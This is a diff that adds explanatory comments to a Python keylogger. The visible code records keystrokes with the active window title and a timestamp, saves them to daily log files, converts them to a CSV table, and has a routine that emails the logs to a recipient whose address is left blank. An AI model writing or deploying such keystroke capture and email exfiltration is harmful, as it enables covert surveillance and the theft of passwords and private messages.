@@ -56,8 +56,8 @@ def convert_to_table():
     print("Most likely it has not been created yet, will continue to run the program")
 
   try:
-    df = pd.read_csv(f, sep='|', encoding="ISO-8859-1", names=["TimeStamp", "Current Window", "KeyStrokes"])
-    df.to_csv(location_of_file_and_name_for_logs_table, index=None, )
+    df = pd.read_csv(f, sep='|', encoding="ISO-8859-1", names=["TimeStamp", "Current Window", "KeyStrokes"])  # sets the encoding, and headers.
+    df.to_csv(location_of_file_and_name_for_logs_table, index=None, )    # sets the name and the location of the table to be saved. 
   except PermissionError:
     print("WARNING: Cannot access the table file. If you have it open, please close it")
 
@@ -66,11 +66,11 @@ def convert_to_table():
 
 # this will open the file and make the first line start with the timestamp next to it.  Ensures it starts with a datetimestamp on the first line at start.
 def give_new_line():
-  date_log_name = datetime.today().strftime('%m-%d-%Y')
+  date_log_name = datetime.today().strftime('%m-%d-%Y')  # date to be added to the log name 
 
-  date_time_stamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')
+  date_time_stamp = datetime.today().strftime('%m-%d-%Y %I:%M %p') # timestamp to be added to indicate the date and the time the key is pressed. 
 
-  if not os.path.exists(path_for_logs):
+  if not os.path.exists(path_for_logs):  # if the log folder does not exist, then create it. 
     os.makedirs(path_for_logs)
 
   location_of_file_and_name = os.path.join(path_for_logs, date_log_name + "-logfile.txt")
@@ -89,11 +89,11 @@ def send_files():
     date_log_name = datetime.today().strftime('%m-%d-%Y')
     date_log_name_string = str(date_log_name)
 
-    email_user = ""
-    email_password = ""
-    email_send = ''
+    email_user = ""  # user name for the email
+    email_password = ""  # password for the email 
+    email_send = ''  # who to send the email to 
 
-    subject = ' file' + date_log_name
+    subject = ' file' + date_log_name  # subject name of the email being sent
 
     msg = MIMEMultipart()
     msg['From'] = email_user
@@ -133,7 +133,7 @@ def OnKeyboardEvent(event):
 
   path = os.getcwd()  # gets the current working directory
 
-  if not os.path.exists(path_for_logs):
+  if not os.path.exists(path_for_logs): # if the file name does not exist, then create the log folder. 
     os.makedirs(path_for_logs)
 
   print("The current working directory is %s" % path)
